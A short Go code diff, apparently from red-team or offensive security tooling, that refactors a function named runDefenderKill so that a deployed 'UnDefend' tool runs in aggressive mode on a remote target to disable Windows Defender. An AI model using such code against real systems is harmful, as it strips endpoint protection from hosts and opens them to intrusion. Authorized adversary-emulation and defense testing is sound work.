@@ -546,8 +546,10 @@ func runDefenderKill(ctx context.Context, exec core.Executor, target tools.NetEx
 	remotePath := deployR.Output
 
 	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
-	killR, _ := tools.UnDefend.ExecRemote(ctx, target, remotePath, tools.UnDefendAggressive)
-	_ = killR
+	_ = exec.Execute(ctx, core.Action{
+		Artifact: remotePath, Method: "run",
+		Arguments: []string{"--aggressive"}, Timeout: 30 * time.Second,
+	})
 	time.Sleep(2 * time.Second)
 
 	exec.Execute(ctx, core.Action{
